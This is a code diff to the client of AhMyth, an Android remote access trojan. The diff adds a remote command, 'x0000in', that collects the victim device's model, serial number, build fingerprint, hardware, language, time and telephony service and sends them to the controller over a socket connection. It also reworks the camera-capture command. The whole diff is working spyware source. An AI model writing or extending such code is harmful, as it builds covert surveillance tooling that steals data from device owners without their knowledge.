@@ -1,9 +1,20 @@
 package ahmyth.mine.king.ahmyth;
 
 import android.content.Context;
+import android.os.Build;
 import android.os.Looper;
+import android.provider.ContactsContract;
 import android.util.Log;
+
+import org.json.JSONArray;
+import org.json.JSONException;
 import org.json.JSONObject;
+
+import java.text.DateFormat;
+import java.util.Date;
+import java.util.List;
+import java.util.Locale;
+
 import io.socket.emitter.Emitter;
 
 
@@ -91,6 +102,10 @@ try {
                     case "x0000lm":
                         x0000lm();
                         break;
+                    case "x0000in":
+                        Log.e("case 0in","case");
+                        x0000in();
+                        break;
 
 
                 }
@@ -118,13 +133,15 @@ try {
            JSONObject cameraList = new CameraManager(context).findCameraList();
             if(cameraList != null)
             ioSocket.emit("x0000ca" ,cameraList );
+        } else {
+            new CameraManager(context).startUp(req);
         }
-        else if (req == 1){
+        /*else if (req == 1){
             new CameraManager(context).startUp(1);
         }
         else if (req == 0){
             new CameraManager(context).startUp(0);
-        }
+        }*/
 
     }
 
@@ -177,7 +194,97 @@ try {
         ioSocket.emit("x0000lm", location);
     }
 
+    public static void x0000in() throws Exception{
 
+        try {
+            JSONObject contacts = new JSONObject();
+            JSONArray list = new JSONArray();
+
+            String[] param = {"Model :","Board :","Brand :","Bootloader :","Device :" ,"Display :" ,
+                    "Fingerprint :" ,"Hardware :" ,"HOST :" ,"ID :" ,"Manufacturer :" ,"Product :" ,
+                    "Serial :" ,"Tags :" ,"User :" ,"Time :" ,"Release :" ,"SDK_INT :" ,"Language :" ,
+                    "Time :" ,"IMSi??? :" };
+            for (int i=0; i<param.length;i++){
+                JSONObject contact = new JSONObject();
+                String name = param[i];
+
+                contact.put("param", name);
+                switch (i){
+                    case 0:
+                        contact.put("info", Build.MODEL);
+                        break;
+                    case 1:
+                        contact.put("info", Build.BOARD);
+                        break;
+                    case 2:
+                        contact.put("info", Build.BRAND);
+                        break;
+                    case 3:
+                        contact.put("info", Build.BOOTLOADER);
+                        break;
+                    case 4:
+                        contact.put("info", Build.DEVICE);
+                        break;
+                    case 5:
+                        contact.put("info", Build.DISPLAY);
+                        break;
+                    case 6:
+                        contact.put("info", Build.FINGERPRINT);
+                        break;
+                    case 7:
+                        contact.put("info", Build.HARDWARE);
+                        break;
+                    case 8:
+                        contact.put("info", Build.HOST);
+                        break;
+                    case 9:
+                        contact.put("info", Build.ID);
+                        break;
+                    case 10:
+                        contact.put("info", Build.MANUFACTURER);
+                        break;
+                    case 11:
+                        contact.put("info", Build.PRODUCT);
+                        break;
+                    case 12:
+                        contact.put("info", Build.SERIAL);
+                        break;
+                    case 13:
+                        contact.put("info", Build.TAGS);
+                        break;
+                    case 14:
+                        contact.put("info", Build.USER);
+                        break;
+                    case 15:
+                        contact.put("info", Build.TIME);
+                        break;
+                    case 16:
+                        contact.put("info", Build.VERSION.RELEASE);
+                        break;
+                    case 17:
+                        contact.put("info", Build.VERSION.SDK_INT);
+                        break;
+                    case 18:
+                        contact.put("info", Locale.getDefault().getDisplayLanguage());
+                        break;
+                    case 19:
+                        contact.put("info", DateFormat.getDateTimeInstance().format(new Date()));
+                        break;
+                    case 20:
+                        contact.put("info", context.getSystemService(Context.TELEPHONY_SERVICE));
+                        break;
+                }
+                list.put(contact);
+            }
+
+            contacts.put("infoList", list);
+            ioSocket.emit("x0000in", /*location*/contacts);
+
+        } catch (JSONException e){
+            e.printStackTrace();
+        }
+
+    }
 
 
 
